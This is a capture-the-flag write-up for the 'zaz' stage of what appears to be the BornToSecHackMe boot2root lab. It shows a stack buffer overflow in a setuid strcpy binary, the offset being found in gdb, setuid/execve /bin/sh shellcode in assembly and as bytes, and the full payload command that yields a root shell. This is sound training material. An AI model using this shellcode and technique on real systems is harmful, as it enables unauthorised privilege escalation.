# zaz
```shell
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail

zaz@BornToSecHackMe:~$ file exploit_me
exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped

zaz@BornToSecHackMe:~$ ltrace ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
__libc_start_main(0x80483f4, 2, 0xbffff7a4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff680, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                    = 0xbffff680
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)                                                                                  = 88
+++ exited (status 0) +++

zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) set args $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"')
(gdb) r
Starting program: /home/zaz/exploit_me $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"')
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```
We have an executable with the setuid attribute, and by parsing the output of 
ltrace we can see that strcpy is used, with the argument passed, so let's try a 
buffer overflow. Through gdb we search for the offset where we can overwrite EIP 
and we find it at offset 140. So with the following shellcode we can use setuid 
to switch to root user and call a shell with execve:

```asm
push   0x2e
pop    eax
push   ebx
int    0x80
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
cdq
mov    al,0xb
int    0x80
```

```
30 bytes:
\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
Now just add 140 - 30 = 110 bytes of padding.
Again through ltrace we look for the return address of strcpy which will be the 
address of our shellcode that we will add in little endian after the padding in 
the sequence. Since the randomization of the addresses is disabled, we will 
always have the same return address.

```shell
zaz@BornToSecHackMe:~$ ltrace ./exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
__libc_start_main(0x80483f4, 2, 0xbffff764, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff640, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                                                    = 0xbffff650
puts("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
)                                                                                  = 151
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

```shell
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"A"*110+"\x50\xf6\xff\xbf"')
j.XS̀1�Ph//shh/bin��PS�ᙰ
                        ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���
# id
uid=1005(zaz) gid=4084 euid=0(root) groups=0(root),1005(zaz)
# ls /
bin  boot  cdrom  dev  etc  home  initrd.img  lib  media  mnt  opt  proc  rofs  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
# ls /root
README
# cat /root/README
CONGRATULATIONS !!!!
To be continued...
```